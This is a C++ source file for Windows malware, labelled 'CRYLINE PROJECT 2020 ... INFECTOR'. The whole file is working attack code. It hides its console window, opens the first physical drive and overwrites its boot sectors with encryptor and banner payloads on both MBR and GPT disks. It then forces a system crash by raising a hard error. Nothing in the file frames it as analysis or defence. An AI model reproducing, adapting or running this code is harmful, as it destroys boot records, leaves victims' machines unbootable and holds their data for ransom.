/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE PROJECT 2020 ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;         v5.0         ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;     - INFECTOR -     ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/



#include <io.h>
#include <math.h>
#include <string>
#include <time.h>
#include <stdio.h>
#include <iostream>
#include <stdint.h>
#include <stdlib.h>
#include <Windows.h>
#include <TlHelp32.h>

#include "cryline_modules.h"
#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS GET_ERROR_STATUS, ULONG NUMBER_OF_PARAMS, ULONG UNICODE_STRING_MASK, PULONG_PTR GET_PARAMS, ULONG GET_VALID_RESPONSE, PULONG GET_RESPONSE);

using namespace std;

void CALL_BSOD()
{
	BOOLEAN GET_FREE_PARAM;
	unsigned long GET_RESPONSE_NT;

	RtlAdjustPrivilege(19, true, false, &GET_FREE_PARAM);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &GET_RESPONSE_NT);
}

void CALL_HIDE_MODE()
{
	HWND GET_CONSOLE_PROCESS = GetConsoleWindow();
	ShowWindow(GET_CONSOLE_PROCESS, SW_HIDE);
	return;
}

void __INFECTION()
{
	try
	{
		DWORD GET_WRITTEN_BYTES;
		HANDLE GET_PHYSICAL_DRIVE = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		if (GET_PHYSICAL_DRIVE == INVALID_HANDLE_VALUE)
		{
			ExitProcess(-1);
		}
		else
		{
			SetFilePointer(GET_PHYSICAL_DRIVE, 0, 0, FILE_BEGIN);
			WriteFile(GET_PHYSICAL_DRIVE, MBR_ENCRYPTOR, 512, &GET_WRITTEN_BYTES, NULL);

			SetFilePointer(GET_PHYSICAL_DRIVE, 512, 0, FILE_BEGIN);
			WriteFile(GET_PHYSICAL_DRIVE, KERNEL_BANNER, 1024, &GET_WRITTEN_BYTES, NULL);

			SetFilePointer(GET_PHYSICAL_DRIVE, 1536, 0, FILE_BEGIN);
			WriteFile(GET_PHYSICAL_DRIVE, KERNEL_ENCRYPTOR, 1024, &GET_WRITTEN_BYTES, NULL);

			SetFilePointer(GET_PHYSICAL_DRIVE, 2560, 0, FILE_BEGIN);
			WriteFile(GET_PHYSICAL_DRIVE, MBR_BANNER, 512, &GET_WRITTEN_BYTES, NULL);

			CloseHandle(GET_PHYSICAL_DRIVE);
			return;
		}
	}
	catch (...)
	{
		ExitProcess(-2);
	}
}


int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	try
	{
		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			ExitProcess(-3);
		}
		else
		{
			SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
			SetErrorMode(SEM_FAILCRITICALERRORS);
			SetProcessPriorityBoost(GetCurrentProcess(), 1);

			CALL_HIDE_MODE();
		}
	}
	catch (...)
	{
		ExitProcess(-4);
	}

	try
	{
		DWORD GET_RETURNED_BYTES;
		HANDLE GET_PHYSICAL_DRIVE = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		PARTITION_INFORMATION_EX GET_INFO;

		DeviceIoControl(GET_PHYSICAL_DRIVE, IOCTL_DISK_GET_PARTITION_INFO, NULL, 0, &GET_INFO, sizeof(GET_INFO), &GET_RETURNED_BYTES, NULL);
		{
			if (GET_INFO.PartitionStyle == PARTITION_STYLE_MBR)
			{
				__INFECTION();
				CloseHandle(GET_PHYSICAL_DRIVE);
				CALL_BSOD();
			}
			else
			{
				if (GET_INFO.PartitionStyle == PARTITION_STYLE_GPT)
				{
					__INFECTION();
					CloseHandle(GET_PHYSICAL_DRIVE);
					CALL_BSOD();
				}
				else
				{
					ExitProcess(-5);
				}
			}
		}
	}
	catch (...)
	{
		ExitProcess(-6);
	}
}